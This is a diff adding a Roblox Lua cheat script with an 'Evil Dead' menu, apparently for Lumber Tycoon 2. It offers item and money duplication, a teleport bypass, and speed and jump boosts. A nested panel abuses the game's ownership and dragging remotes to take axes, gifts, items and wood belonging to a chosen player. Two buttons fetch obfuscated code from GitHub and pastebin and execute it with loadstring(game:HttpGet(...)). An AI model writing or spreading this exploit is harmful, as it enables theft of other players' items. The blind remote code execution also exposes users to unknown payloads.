@@ -1,0 +1,1168 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local Evildead = Instance.new("ScreenGui")
+local Mainframe = Instance.new("Frame")
+local Topbar = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local Dupestuffexit = Instance.new("TextButton")
+local Localplayerexit = Instance.new("TextButton")
+local TPbypassexit = Instance.new("TextButton")
+local space = Instance.new("TextButton")
+local Rainbow = Instance.new("Frame")
+local Rainbow_2 = Instance.new("Frame")
+local Scripts = Instance.new("Folder")
+local Dupestuffbnt = Instance.new("TextButton")
+local Dupestuff = Instance.new("Frame")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local Basedropnew = Instance.new("TextButton")
+local Axedupe = Instance.new("TextButton")
+local Moneydupe = Instance.new("TextButton")
+local Rainbow_3 = Instance.new("Frame")
+local Localplayerbnt = Instance.new("TextButton")
+local Localplayer = Instance.new("Frame")
+local ScrollingFrame_2 = Instance.new("ScrollingFrame")
+local jumpsc = Instance.new("TextButton")
+local Walksp = Instance.new("TextButton")
+local jumppw = Instance.new("TextButton")
+local Rainbow_4 = Instance.new("Frame")
+local TPbypassbnt = Instance.new("TextButton")
+local Tpbypass = Instance.new("Frame")
+local ScrollingFrame_3 = Instance.new("ScrollingFrame")
+local Spawn = Instance.new("TextButton")
+local WoodsRus = Instance.new("TextButton")
+local LandStore = Instance.new("TextButton")
+local Rainbow_5 = Instance.new("Frame")
+local FancyFurnishings = Instance.new("TextButton")
+local Boxcar = Instance.new("TextButton")
+local LogicStore = Instance.new("TextButton")
+local FineArt = Instance.new("TextButton")
+
+--Properties:
+
+Evildead.Parent = game.CoreGui
+Evildead.Name = "Evildead"
+Evildead.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+Evildead.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Evildead.ResetOnSpawn = false
+
+Mainframe.Name = "Mainframe"
+Mainframe.Parent = Evildead
+Mainframe.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Mainframe.BackgroundTransparency = 0.500
+Mainframe.Position = UDim2.new(0.142705157, 0, 0.190533981, 0)
+Mainframe.Size = UDim2.new(0, 247, 0, 509)
+Mainframe.Active = true
+Mainframe.Draggable = true
+Mainframe.Visible = true
+
+Topbar.Name = "Topbar"
+Topbar.Parent = Mainframe
+Topbar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Topbar.BackgroundTransparency = 1.000
+Topbar.Size = UDim2.new(0, 247, 0, 38)
+
+TextLabel.Parent = Topbar
+TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.0040485831, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 245, 0, 38)
+TextLabel.Font = Enum.Font.Garamond
+TextLabel.Text = "Evil Dead"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+Dupestuffexit.Name = "Dupestuffexit"
+Dupestuffexit.Parent = Mainframe
+Dupestuffexit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Dupestuffexit.Position = UDim2.new(0.813765168, 0, 0.159135565, 0)
+Dupestuffexit.Size = UDim2.new(0, 45, 0, 25)
+Dupestuffexit.Font = Enum.Font.SourceSansItalic
+Dupestuffexit.Text = "Dupe stuff exit"
+Dupestuffexit.TextColor3 = Color3.fromRGB(0, 0, 0)
+Dupestuffexit.TextScaled = true
+Dupestuffexit.TextSize = 14.000
+Dupestuffexit.TextWrapped = true
+Dupestuffexit.MouseButton1Down:Connect(function()
+	Dupestuff.Visible = false
+end)
+
+Localplayerexit.Name = "Localplayerexit"
+Localplayerexit.Parent = Mainframe
+Localplayerexit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Localplayerexit.Position = UDim2.new(0.813765168, 0, 0.110019647, 0)
+Localplayerexit.Size = UDim2.new(0, 45, 0, 25)
+Localplayerexit.Font = Enum.Font.SourceSansItalic
+Localplayerexit.Text = "Local player exit"
+Localplayerexit.TextColor3 = Color3.fromRGB(0, 0, 0)
+Localplayerexit.TextScaled = true
+Localplayerexit.TextSize = 14.000
+Localplayerexit.TextWrapped = true
+Localplayerexit.MouseButton1Down:Connect(function()
+	Localplayer.Visible = false
+end)
+
+TPbypassexit.Name = "TPbypassexit"
+TPbypassexit.Parent = Mainframe
+TPbypassexit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TPbypassexit.Position = UDim2.new(0.813765168, 0, 0.208251476, 0)
+TPbypassexit.Size = UDim2.new(0, 45, 0, 25)
+TPbypassexit.Font = Enum.Font.SourceSansItalic
+TPbypassexit.Text = "Tp Bypass exit"
+TPbypassexit.TextColor3 = Color3.fromRGB(0, 0, 0)
+TPbypassexit.TextScaled = true
+TPbypassexit.TextSize = 14.000
+TPbypassexit.TextWrapped = true
+TPbypassexit.MouseButton1Down:Connect(function()
+	Tpbypass.Visible = false
+end)
+
+space.Name = "space"
+space.Parent = Mainframe
+space.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+space.Position = UDim2.new(0.00404857099, 0, 0.257367373, 0)
+space.Size = UDim2.new(0, 200, 0, 25)
+space.Font = Enum.Font.SourceSansItalic
+space.Text = "space"
+space.TextColor3 = Color3.fromRGB(0, 0, 0)
+space.TextScaled = true
+space.TextSize = 14.000
+space.TextWrapped = true
+
+Rainbow.Name = "Rainbow"
+Rainbow.Parent = Mainframe
+Rainbow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Rainbow.Position = UDim2.new(-0.00172197819, 0, 0.0740052164, 0)
+Rainbow.Size = UDim2.new(0, 247, 0, 7)
+
+Rainbow_2.Name = "Rainbow"
+Rainbow_2.Parent = Mainframe
+Rainbow_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Rainbow_2.Position = UDim2.new(-0.00172198378, 0, 0.985869884, 0)
+Rainbow_2.Size = UDim2.new(0, 247, 0, 7)
+
+Scripts.Name = "Scripts"
+Scripts.Parent = Mainframe
+
+Dupestuffbnt.Name = "Dupestuffbnt"
+Dupestuffbnt.Parent = Mainframe
+Dupestuffbnt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Dupestuffbnt.Position = UDim2.new(0.0040485831, 0, 0.159135565, 0)
+Dupestuffbnt.Size = UDim2.new(0, 200, 0, 25)
+Dupestuffbnt.Font = Enum.Font.SourceSansItalic
+Dupestuffbnt.Text = "Dupe stuff"
+Dupestuffbnt.TextColor3 = Color3.fromRGB(0, 0, 0)
+Dupestuffbnt.TextScaled = true
+Dupestuffbnt.TextSize = 14.000
+Dupestuffbnt.TextWrapped = true
+Dupestuffbnt.MouseButton1Down:Connect(function()
+	Dupestuff.Visible = true
+end)
+
+Dupestuff.Name = "Dupestuff"
+Dupestuff.Parent = Dupestuffbnt
+Dupestuff.Active = true
+Dupestuff.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Dupestuff.BackgroundTransparency = 0.500
+Dupestuff.Position = UDim2.new(1.23000002, 0, 0.42424193, 0)
+Dupestuff.Size = UDim2.new(0, 249, 0, 409)
+Dupestuff.Visible = false
+
+ScrollingFrame.Parent = Dupestuff
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(77, 77, 77)
+ScrollingFrame.BackgroundTransparency = 0.500
+ScrollingFrame.Size = UDim2.new(0, 248, 0, 409)
+
+Basedropnew.Name = "Basedropnew"
+Basedropnew.Parent = ScrollingFrame
+Basedropnew.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Basedropnew.Position = UDim2.new(0.00349038839, 0, 0.0537897311, 0)
+Basedropnew.Size = UDim2.new(0, 200, 0, 33)
+Basedropnew.Font = Enum.Font.SourceSansItalic
+Basedropnew.Text = "Base drop new"
+Basedropnew.TextColor3 = Color3.fromRGB(0, 0, 0)
+Basedropnew.TextScaled = true
+Basedropnew.TextSize = 14.000
+Basedropnew.TextWrapped = true
+Basedropnew.MouseButton1Down:Connect(function()
+	-- Farewell Infortality.
+-- Version: 2.82
+-- Instances:
+local Testing = Instance.new("ScreenGui")
+local Move = Instance.new("TextButton")
+local Nothing = Instance.new("Frame")
+local Player6 = Instance.new("TextButton")
+local Player5 = Instance.new("TextButton")
+local Player4 = Instance.new("TextButton")
+local Nothing_2 = Instance.new("Frame")
+local PlayerName = Instance.new("TextBox")
+local Player3 = Instance.new("TextButton")
+local Player2 = Instance.new("TextButton")
+local Player1 = Instance.new("TextButton")
+local Exit = Instance.new("TextButton")
+local Nothing_3 = Instance.new("Frame")
+local SAxe = Instance.new("TextButton")
+local SGifts = Instance.new("TextButton")
+local SItems = Instance.new("TextButton")
+local SWood = Instance.new("TextButton")
+local Nothing_4 = Instance.new("Frame")
+local Cords = Instance.new("TextButton")
+local Nothing_5 = Instance.new("Frame")
+local CordText = Instance.new("TextLabel")
+--Properties:
+Testing.Name = "Testing"
+Testing.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+Testing.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Move.Name = "Move"
+Move.Parent = Testing
+Move.BackgroundColor3 = Color3.new(255, 0.356863, 0.356863)
+Move.BorderColor3 = Color3.new(0.207843, 0.207843, 0.207843)
+Move.Position = UDim2.new(0.650996625, 0, 0.456037968, 0)
+Move.Size = UDim2.new(0, 96, 0, 22)
+Move.Font = Enum.Font.SciFi
+Move.Text = "Mabe By ModKing"
+Move.TextColor3 = Color3.new(255, 6, 0)
+Move.TextSize = 11
+Move.Draggable = true
+
+Nothing.Name = "Nothing"
+Nothing.Parent = Move
+Nothing.BackgroundColor3 = Color3.new(1, 1, 1)
+Nothing.Position = UDim2.new(0, 0, 1, 0)
+Nothing.Size = UDim2.new(0, 117, 0, 191)
+Nothing.Style = Enum.FrameStyle.RobloxRound
+
+Player6.Name = "Player6"
+Player6.Parent = Nothing
+Player6.BackgroundColor3 = Color3.new(1, 1, 1)
+Player6.Position = UDim2.new(0.0371949263, 0, 0.183246076, 0)
+Player6.Size = UDim2.new(0, 94, 0, 24)
+Player6.Style = Enum.ButtonStyle.RobloxRoundButton
+Player6.Font = Enum.Font.SourceSans
+Player6.Text = ""
+Player6.TextColor3 = Color3.new(0, 0, 0)
+Player6.TextSize = 14
+
+Player5.Name = "Player5"
+Player5.Parent = Nothing
+Player5.BackgroundColor3 = Color3.new(1, 1, 1)
+Player5.Position = UDim2.new(0.0402445979, 0, 0.325027049, 0)
+Player5.Size = UDim2.new(0, 94, 0, 24)
+Player5.Style = Enum.ButtonStyle.RobloxRoundButton
+Player5.Font = Enum.Font.SourceSans
+Player5.Text = ""
+Player5.TextColor3 = Color3.new(0, 0, 0)
+Player5.TextSize = 14
+
+Player4.Name = "Player4"
+Player4.Parent = Nothing
+Player4.BackgroundColor3 = Color3.new(1, 1, 1)
+Player4.Position = UDim2.new(0.0402445979, 0, 0.460459799, 0)
+Player4.Size = UDim2.new(0, 94, 0, 24)
+Player4.Style = Enum.ButtonStyle.RobloxRoundButton
+Player4.Font = Enum.Font.SourceSans
+Player4.Text = ""
+Player4.TextColor3 = Color3.new(0, 0, 0)
+Player4.TextSize = 14
+
+Nothing_2.Name = "Nothing"
+Nothing_2.Parent = Nothing
+Nothing_2.BackgroundColor3 = Color3.new(1, 1, 1)
+Nothing_2.Position = UDim2.new(-0.0769230798, 0, 0.0108696893, 0)
+Nothing_2.Size = UDim2.new(0, 118, 0, 25)
+Nothing_2.Style = Enum.FrameStyle.RobloxRound
+
+PlayerName.Name = "PlayerName"
+PlayerName.Parent = Nothing_2
+PlayerName.BackgroundColor3 = Color3.new(1, 1, 1)
+PlayerName.BackgroundTransparency = 1
+PlayerName.Position = UDim2.new(-0.0348250717, 0, -1.08173847, 0)
+PlayerName.Size = UDim2.new(0, 107, 0, 28)
+PlayerName.Font = Enum.Font.SourceSans
+PlayerName.Text = ""
+PlayerName.TextColor3 = Color3.new(1, 1, 1)
+PlayerName.TextSize = 14
+
+Player3.Name = "Player3"
+Player3.Parent = Nothing
+Player3.BackgroundColor3 = Color3.new(1, 1, 1)
+Player3.Position = UDim2.new(0.0432942696, 0, 0.597005248, 0)
+Player3.Size = UDim2.new(0, 94, 0, 24)
+Player3.Style = Enum.ButtonStyle.RobloxRoundButton
+Player3.Font = Enum.Font.SourceSans
+Player3.Text = ""
+Player3.TextColor3 = Color3.new(0, 0, 0)
+Player3.TextSize = 14
+
+Player2.Name = "Player2"
+Player2.Parent = Nothing
+Player2.BackgroundColor3 = Color3.new(1, 1, 1)
+Player2.Position = UDim2.new(0.0402445979, 0, 0.73840338, 0)
+Player2.Size = UDim2.new(0, 94, 0, 24)
+Player2.Style = Enum.ButtonStyle.RobloxRoundButton
+Player2.Font = Enum.Font.SourceSans
+Player2.Text = ""
+Player2.TextColor3 = Color3.new(0, 0, 0)
+Player2.TextSize = 14
+
+Player1.Name = "Player1"
+Player1.Parent = Nothing
+Player1.BackgroundColor3 = Color3.new(1, 1, 1)
+Player1.Position = UDim2.new(0.0432942696, 0, 0.880183876, 0)
+Player1.Size = UDim2.new(0, 94, 0, 24)
+Player1.Style = Enum.ButtonStyle.RobloxRoundButton
+Player1.Font = Enum.Font.SourceSans
+Player1.Text = ""
+Player1.TextColor3 = Color3.new(0, 0, 0)
+Player1.TextSize = 14
+
+Exit.Name = "Exit"
+Exit.Parent = Move
+Exit.BackgroundColor3 = Color3.new(0.356863, 0.356863, 0.356863)
+Exit.BorderColor3 = Color3.new(0.207843, 0.207843, 0.207843)
+Exit.Position = UDim2.new(0, 95, 0, 0)
+Exit.Size = UDim2.new(0, 22, 0, 22)
+Exit.Font = Enum.Font.SourceSans
+Exit.Text = "X"
+Exit.TextColor3 = Color3.new(0, 0, 0)
+Exit.TextSize = 14
+
+Nothing_3.Name = "Nothing"
+Nothing_3.Parent = Move
+Nothing_3.BackgroundColor3 = Color3.new(1, 1, 1)
+Nothing_3.Position = UDim2.new(1.21875, 0, 3.77272725, 0)
+Nothing_3.Size = UDim2.new(0, 94, 0, 130)
+Nothing_3.Style = Enum.FrameStyle.RobloxRound
+
+SAxe.Name = "SAxe"
+SAxe.Parent = Nothing_3
+SAxe.BackgroundColor3 = Color3.new(1, 1, 1)
+SAxe.Position = UDim2.new(0, -4, 0, 3)
+SAxe.Size = UDim2.new(0, 86, 0, 22)
+SAxe.Style = Enum.ButtonStyle.RobloxRoundButton
+SAxe.Font = Enum.Font.SourceSans
+SAxe.Text = "Steal Axe"
+SAxe.TextColor3 = Color3.new(0, 0, 0)
+SAxe.TextSize = 14
+
+SGifts.Name = "SGifts"
+SGifts.Parent = Nothing_3
+SGifts.BackgroundColor3 = Color3.new(1, 1, 1)
+SGifts.Position = UDim2.new(0, -4, 0, 89)
+SGifts.Size = UDim2.new(0, 86, 0, 22)
+SGifts.Style = Enum.ButtonStyle.RobloxRoundButton
+SGifts.Font = Enum.Font.SourceSans
+SGifts.Text = "Steal Gifts"
+SGifts.TextColor3 = Color3.new(0, 0, 0)
+SGifts.TextSize = 14
+
+SItems.Name = "SItems"
+SItems.Parent = Nothing_3
+SItems.BackgroundColor3 = Color3.new(1, 1, 1)
+SItems.Position = UDim2.new(0, -4, 0, 30)
+SItems.Size = UDim2.new(0, 86, 0, 22)
+SItems.Style = Enum.ButtonStyle.RobloxRoundButton
+SItems.Font = Enum.Font.SourceSans
+SItems.Text = "Loose Items"
+SItems.TextColor3 = Color3.new(0, 0, 0)
+SItems.TextSize = 14
+
+SWood.Name = "SWood"
+SWood.Parent = Nothing_3
+SWood.BackgroundColor3 = Color3.new(1, 1, 1)
+SWood.Position = UDim2.new(0, -4, 0, 60)
+SWood.Size = UDim2.new(0, 86, 0, 22)
+SWood.Style = Enum.ButtonStyle.RobloxRoundButton
+SWood.Font = Enum.Font.SourceSans
+SWood.Text = "Steal Wood"
+SWood.TextColor3 = Color3.new(0, 0, 0)
+SWood.TextSize = 14
+
+Nothing_4.Name = "Nothing"
+Nothing_4.Parent = Move
+Nothing_4.BackgroundColor3 = Color3.new(1, 1, 1)
+Nothing_4.Position = UDim2.new(1.21683657, 0, 1, 0)
+Nothing_4.Size = UDim2.new(0, 95, 0, 60)
+Nothing_4.Style = Enum.FrameStyle.RobloxRound
+
+Cords.Name = "Cords"
+Cords.Parent = Nothing_4
+Cords.BackgroundColor3 = Color3.new(1, 1, 1)
+Cords.Position = UDim2.new(-0.0157650597, 0, 0.49777782, 0)
+Cords.Size = UDim2.new(0, 80, 0, 22)
+Cords.Style = Enum.ButtonStyle.RobloxRoundButton
+Cords.Font = Enum.Font.SourceSans
+Cords.Text = "Cords"
+Cords.TextColor3 = Color3.new(0, 0, 0)
+Cords.TextSize = 14
+
+Nothing_5.Name = "Nothing"
+Nothing_5.Parent = Nothing_4
+Nothing_5.BackgroundColor3 = Color3.new(1, 1, 1)
+Nothing_5.Position = UDim2.new(0, -8, 0, -3)
+Nothing_5.Size = UDim2.new(0, 94, 0, 24)
+Nothing_5.Style = Enum.FrameStyle.RobloxRound
+
+CordText.Name = "CordText"
+CordText.Parent = Nothing_5
+CordText.BackgroundColor3 = Color3.new(1, 1, 1)
+CordText.BackgroundTransparency = 1
+CordText.Position = UDim2.new(-0.0227160417, 0, -1.23696125, 0)
+CordText.Size = UDim2.new(0, 80, 0, 26)
+CordText.Font = Enum.Font.SourceSans
+CordText.Text = ""
+CordText.TextColor3 = Color3.new(1, 1, 1)
+CordText.TextSize = 14
+
+Cords.MouseButton1Click:connect(function()
+function round(num, numDecimalPlaces)
+		local mult = 10^(numDecimalPlaces or 0)
+		return math.floor(num * mult + 0.5) / mult
+	end
+
+	LocationX = round(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.x, 1)
+	LocationY = round(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.y, 1)
+	LocationZ = round(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.z, 1)
+	CordText.Text = ""..LocationX..", "..LocationY..", "..LocationZ
+end)
+
+CustomLocationSet = false
+
+CustomLocationSet = false
+
+
+
+SAxe.MouseButton1Click:connect(function()
+	local plr = PlayerName.Text
+local StealType = "Tool"
+
+local Times = 0
+for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
+if v:FindFirstChild("Owner") and tostring(v.Owner.Value) == plr then
+if StealType ~= "TreeClass" then
+if v:FindFirstChild("Type") and tostring(v.Type.Value) == StealType then
+if v.PrimaryPart then
+v.PrimaryPart.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(v.PrimaryPart)
+v.PrimaryPart.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.PrimaryPart)
+v.PrimaryPart.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+Times = Times + 1
+if Times == 10 then
+Times = 0
+wait(0.1)
+end
+end
+end
+else
+if v:FindFirstChild("TreeClass") then
+if v.WoodSection then
+v.WoodSection.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(v.WoodSection)
+v.WoodSection.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.WoodSection)
+v.WoodSection.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+Times = Times + 1
+if Times == 10 then
+Times = 0
+wait(0.1)
+end
+end
+end
+end
+end
+end
+end)
+
+SItems.MouseButton1Click:connect(function()
+	local plr = PlayerName.Text
+local StealType = "Loose Item"
+
+local Times = 0
+for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
+if v:FindFirstChild("Owner") and tostring(v.Owner.Value) == plr then
+if StealType ~= "TreeClass" then
+if v:FindFirstChild("Type") and tostring(v.Type.Value) == StealType then
+if v.PrimaryPart then
+v.PrimaryPart.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(v.PrimaryPart)
+v.PrimaryPart.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.PrimaryPart)
+v.PrimaryPart.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+Times = Times + 1
+if Times == 10 then
+Times = 0
+wait(0.1)
+end
+end
+end
+else
+if v:FindFirstChild("TreeClass") then
+if v.WoodSection then
+v.WoodSection.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(v.WoodSection)
+v.WoodSection.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.WoodSection)
+v.WoodSection.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+Times = Times + 1
+if Times == 10 then
+Times = 0
+wait(0.1)
+end
+end
+end
+end
+end
+end
+end)
+
+SGifts.MouseButton1Click:connect(function()
+local plr = PlayerName.Text
+local StealType = "Gift"
+
+local Times = 0
+for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
+if v:FindFirstChild("Owner") and tostring(v.Owner.Value) == plr then
+if StealType ~= "TreeClass" then
+if v:FindFirstChild("Type") and tostring(v.Type.Value) == StealType then
+if v.PrimaryPart then
+v.PrimaryPart.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(v.PrimaryPart)
+v.PrimaryPart.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.PrimaryPart)
+v.PrimaryPart.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+Times = Times + 1
+if Times == 10 then
+Times = 0
+wait(0.1)
+end
+end
+end
+else
+if v:FindFirstChild("TreeClass") then
+if v.WoodSection then
+v.WoodSection.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(v.WoodSection)
+v.WoodSection.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.WoodSection)
+v.WoodSection.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+Times = Times + 1
+if Times == 10 then
+Times = 0
+wait(0.1)
+end
+end
+end
+end
+end
+end
+end)
+
+SWood.MouseButton1Click:connect(function()
+	local plr = PlayerName.Text
+local StealType = "TreeClass"
+
+if CustomLocationSet == true then
+local Times = 0
+for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
+if v:FindFirstChild("Owner") and tostring(v.Owner.Value) == plr then
+if StealType ~= "TreeClass" then
+if v:FindFirstChild("Type") and tostring(v.Type.Value) == StealType then
+if v.PrimaryPart then
+v.PrimaryPart.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(v.PrimaryPart)
+v.PrimaryPart.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.PrimaryPart)
+v.PrimaryPart.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+Times = Times + 1
+if Times == 10 then
+Times = 0
+wait(0.1)
+end
+end
+end
+else
+if v:FindFirstChild("TreeClass") then
+if v.WoodSection then
+v.WoodSection.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(v.WoodSection)
+v.WoodSection.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.WoodSection)
+v.WoodSection.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
+Times = Times + 1
+if Times == 10 then
+Times = 0
+wait(0.1)
+end
+end
+end
+end
+end
+end
+end
+end)
+
+Exit.MouseButton1Click:connect(function()
+	Move.Visible = false
+end)
+
+local buttons = {
+		Player1,
+		Player2,
+		Player3,
+		Player4,
+		Player5,
+		Player6
+	}
+	spawn(function()
+		while true do
+			Player1.Text = ""
+			Player2.Text = ""
+			Player3.Text = ""
+			Player4.Text = ""
+			Player5.Text = ""
+			Player6.Text = ""
+			for i, v in pairs(game.Players:GetChildren()) do
+				buttons[i].Text = v.Name
+				buttons[i].Visible = true
+			end
+			wait(0.5)
+		end
+	end)
+
+	Player1.MouseButton1Down:connect(function()
+      PlayerName.Text = Player1.Text
+    end)
+    Player2.MouseButton1Down:connect(function()
+      PlayerName.Text = Player2.Text
+    end)
+    Player3.MouseButton1Down:connect(function()
+      PlayerName.Text = Player3.Text
+    end)
+    Player4.MouseButton1Down:connect(function()
+      PlayerName.Text = Player4.Text
+    end)
+    Player5.MouseButton1Down:connect(function()
+      PlayerName.Text = Player5.Text
+    end)
+    Player6.MouseButton1Down:connect(function()
+      PlayerName.Text = Player6.Text
+    end)
+
+ if PlayerName.Text == "SELECT A PLAYER" then
+        warn("No Player Selected")
+      else
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[PlayerName.Text].HumanoidRootPart.CFrame
+      end
+end)
+
+Axedupe.Name = "Axedupe"
+Axedupe.Parent = ScrollingFrame
+Axedupe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Axedupe.Position = UDim2.new(-1.3038516e-08, 0, 0.134474322, 0)
+Axedupe.Size = UDim2.new(0, 200, 0, 33)
+Axedupe.Font = Enum.Font.SourceSansItalic
+Axedupe.Text = "Axe dupe"
+Axedupe.TextColor3 = Color3.fromRGB(0, 0, 0)
+Axedupe.TextScaled = true
+Axedupe.TextSize = 14.000
+Axedupe.TextWrapped = true
+Axedupe.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Diamondlt2/Diamondlt2/master/Obfuscated", true))()
+end)
+
+Moneydupe.Name = "Moneydupe"
+Moneydupe.Parent = ScrollingFrame
+Moneydupe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Moneydupe.Position = UDim2.new(-1.3038516e-08, 0, 0.215158924, 0)
+Moneydupe.Size = UDim2.new(0, 200, 0, 33)
+Moneydupe.Font = Enum.Font.SourceSansItalic
+Moneydupe.Text = "Money dupe"
+Moneydupe.TextColor3 = Color3.fromRGB(0, 0, 0)
+Moneydupe.TextScaled = true
+Moneydupe.TextSize = 14.000
+Moneydupe.TextWrapped = true
+Moneydupe.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/XwLSKeAc", true))()
+end)
+
+Rainbow_3.Name = "Rainbow"
+Rainbow_3.Parent = ScrollingFrame
+Rainbow_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Rainbow_3.Position = UDim2.new(0.0036663413, 0, -0.00075134635, 0)
+Rainbow_3.Size = UDim2.new(0, 572, 0, 11)
+
+Localplayerbnt.Name = "Localplayerbnt"
+Localplayerbnt.Parent = Mainframe
+Localplayerbnt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Localplayerbnt.Position = UDim2.new(0.00404858589, 0, 0.110019639, 0)
+Localplayerbnt.Size = UDim2.new(0, 200, 0, 25)
+Localplayerbnt.Font = Enum.Font.SourceSansItalic
+Localplayerbnt.Text = "Local player"
+Localplayerbnt.TextColor3 = Color3.fromRGB(0, 0, 0)
+Localplayerbnt.TextScaled = true
+Localplayerbnt.TextSize = 14.000
+Localplayerbnt.TextWrapped = true
+Localplayerbnt.MouseButton1Down:Connect(function()
+	Localplayer.Visible = true
+end)
+
+Localplayer.Name = "Localplayer"
+Localplayer.Parent = Localplayerbnt
+Localplayer.Active = true
+Localplayer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Localplayer.BackgroundTransparency = 0.500
+Localplayer.Position = UDim2.new(1.23000002, 0, 0.424242496, 0)
+Localplayer.Size = UDim2.new(0, 573, 0, 409)
+Localplayer.Visible = false
+
+ScrollingFrame_2.Parent = Localplayer
+ScrollingFrame_2.Active = true
+ScrollingFrame_2.BackgroundColor3 = Color3.fromRGB(77, 77, 77)
+ScrollingFrame_2.BackgroundTransparency = 0.500
+ScrollingFrame_2.Size = UDim2.new(0, 573, 0, 409)
+
+jumpsc.Name = "jumpsc"
+jumpsc.Parent = ScrollingFrame_2
+jumpsc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+jumpsc.Position = UDim2.new(0.00349038839, 0, 0.0537897311, 0)
+jumpsc.Size = UDim2.new(0, 200, 0, 33)
+jumpsc.Font = Enum.Font.SourceSansItalic
+jumpsc.Text = "Infinite jump"
+jumpsc.TextColor3 = Color3.fromRGB(0, 0, 0)
+jumpsc.TextScaled = true
+jumpsc.TextSize = 14.000
+jumpsc.TextWrapped = true
+
+Walksp.Name = "Walksp"
+Walksp.Parent = ScrollingFrame_2
+Walksp.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Walksp.Position = UDim2.new(-1.3038516e-08, 0, 0.134474322, 0)
+Walksp.Size = UDim2.new(0, 200, 0, 33)
+Walksp.Font = Enum.Font.SourceSansItalic
+Walksp.Text = "Walk speed 100"
+Walksp.TextColor3 = Color3.fromRGB(0, 0, 0)
+Walksp.TextScaled = true
+Walksp.TextSize = 14.000
+Walksp.TextWrapped = true
+
+jumppw.Name = "jumppw"
+jumppw.Parent = ScrollingFrame_2
+jumppw.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+jumppw.Position = UDim2.new(-1.3038516e-08, 0, 0.215158924, 0)
+jumppw.Size = UDim2.new(0, 200, 0, 33)
+jumppw.Font = Enum.Font.SourceSansItalic
+jumppw.Text = "Jump power 100"
